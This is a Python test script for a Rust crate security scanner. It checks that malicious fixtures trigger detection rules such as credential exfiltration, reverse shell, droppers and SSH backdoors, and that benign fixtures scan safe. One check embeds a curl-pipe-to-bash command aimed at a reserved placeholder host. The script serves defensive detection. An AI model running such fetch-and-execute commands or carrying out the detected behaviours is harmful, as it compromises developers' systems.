#!/usr/bin/env python3
"""Canary + control tests.

Every mal-* fixture must reach its expected level AND fire its expected pattern; every ok-*
fixture (patterns popular crates really use) must scan SAFE. The fixtures are inert: hosts
are reserved (.invalid / TEST-NET), and nothing here is ever compiled or executed.

    python tests/run.py
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import crate_audit as ca  # noqa: E402

EXPECT = {
    "mal-build-curl-sh": ("CRITICAL", "download_execute"),
    "mal-env-exfil": ("CRITICAL", "env_exfil"),
    "mal-cred-theft": ("CRITICAL", "credential_exfil"),
    "mal-dropper-ci": ("CRITICAL", "dropper"),
    "mal-key-harvest": ("CRITICAL", "key_harvest"),
    "mal-proc-macro-net": ("HIGH", "macro_network"),
    "mal-persist": ("CRITICAL", "persistence_write"),
    "mal-revshell": ("CRITICAL", "reverse_shell"),
    "mal-obfuscated": ("CRITICAL", "obfuscation"),
    "mal-worm": ("CRITICAL", "worm_propagation"),
    "mal-xor-command": ("HIGH", "obfuscation"),       # real rustdecimal shape (RECALL.md)
    "mal-macro-opener": ("HIGH", "macro_spawn"),      # real better-macro shape
    "mal-bat-dropper": ("CRITICAL", "dropper"),       # real registry-win shape
    # post-freeze rules (wave 5, from real artifacts that the frozen rules missed)
    "mal-b64-endpoint": ("HIGH", "hidden_endpoint"),  # sha-rust / microsoftsystem64
    "mal-hex-token": ("HIGH", "hidden_endpoint"),     # env-test-guard
    "mal-ssh-backdoor": ("HIGH", "ssh_backdoor"),     # logs-update
    "mal-build-install": ("CRITICAL", "build_install"),  # pretty-changelog-logger
    "mal-secret-env": ("HIGH", "secret_env_exfil"),   # rpc-check
    "mal-build-recon": ("CRITICAL", "recon_exfil"),   # jfrog_quotes / custom-req-on-workers
}


def main():
    fails = 0
    root = os.path.join(HERE, "fixtures")
    for name in sorted(os.listdir(root)):
        r = ca.scan_crate(ca.files_from_dir(os.path.join(root, name)), name)
        ids = sorted({f["id"] for f in r["findings"]})
        if name.startswith("mal-"):
            want, fid = EXPECT[name]
            ok = ca.SEV_ORDER[r["risk_level"]] >= ca.SEV_ORDER[want] and fid in ids
        else:
            want, fid = "SAFE", "-"
            ok = r["risk_level"] == "SAFE"
        fails += not ok
        print("%s %-20s got=%-8s want=%-8s %-20s %s" % (
            "PASS" if ok else "FAIL", name, r["risk_level"], want, fid, ids))
    checks = [
        (ca.scan("Command::new(\"sh\").arg(\"-c\").arg(\"curl https://x.invalid/a | bash\")")["risk_level"] == "CRITICAL",
         "--text pipe-to-shell"),
        (ca.scan("println!(\"cargo:rerun-if-changed=build.rs\");")["risk_level"] == "SAFE", "--text benign"),
        (ca.split_spec("serde@1.0.0") == ("serde", "1.0.0"), "split versioned"),
        (ca.split_spec("serde") == ("serde", "latest"), "split bare"),
        (ca.manifest_info('[package]\nname = "x"\nbuild = false\n[lib]\nproc-macro = true\n')["proc_macro"], "toml proc-macro"),
    ]
    for ok, label in checks:
        fails += not ok
        print("%s %s" % ("PASS" if ok else "FAIL", label))
    print("\n%d failure(s)" % fails)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
